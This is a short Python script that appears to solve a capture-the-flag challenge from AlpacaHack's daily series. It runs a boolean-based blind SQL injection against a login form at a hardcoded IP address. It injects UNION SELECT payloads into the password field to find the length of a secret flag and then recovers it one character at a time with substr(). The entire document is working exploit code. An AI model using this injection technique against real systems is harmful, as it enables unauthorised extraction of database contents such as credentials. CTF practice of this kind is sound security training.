# https://github.com/baumroll0928-spec/myRepository/tree/main/Daily_AlpacaHack/m202607/d10_secret-table-3

from requests import post

HOST, PORT = "34.170.146.252", 25744
URL = f"http://{HOST}:{PORT}/login"


def check_length(pos: int):
    data = {
        "username": "alpaca",
        "password": f"' union select 1, flag from secret where length(flag) = {pos}; --",
    }
    res = post(URL, data=data)
    return "Hello, user!" in res.text


def check_char(pos: int, ch: str):
    data = {
        "username": "alpaca",
        "password": f"' union select 1, flag from secret where substr(flag,{pos},1) = '{ch}",
    }
    res = post(URL, data=data)
    return "Hello, user!" in res.text


pos = 8
while True:
    print(f"{pos = }")
    if check_length(pos):
        break
    pos += 1
len_flag = pos

flag = "Alpaca{"
for pos in range(8, len_flag):
    print(f"{flag = }")
    for c in range(0x20, 0x7F):
        ch = chr(c)
        if ch == "'":
            continue
        if check_char(pos, ch):
            flag += ch
            break

flag += "}"
print(f"{flag = }")
